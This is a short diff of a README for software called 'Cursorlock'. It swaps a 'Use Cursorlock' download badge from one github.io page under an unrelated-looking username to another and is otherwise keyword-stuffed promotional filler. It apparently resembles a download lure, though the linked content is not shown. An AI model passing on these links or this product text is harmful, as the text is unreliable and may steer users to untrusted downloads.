@@ -1,6 +1,6 @@
 # Cursorlock Download - Productivity For Efficient Setup And Reliable Everyday Results
 
-[![Use Cursorlock](https://img.shields.io/badge/Use-cursorlock-e17055?style=flat&logo=git)](https://annsanchez041999.github.io/.github/cursorlock-download)
+[![Use Cursorlock](https://img.shields.io/badge/Use-cursorlock-e17055?style=flat&logo=git)](https://lucienbaileyucde.github.io/.github/cursorlock-download)
 
 ## Cursorlock Overview
 Cursorlock connects cursorlock-download and cursorlock-setup to how teams actually search for tooling in real desktop environments, not just marketing glossaries.
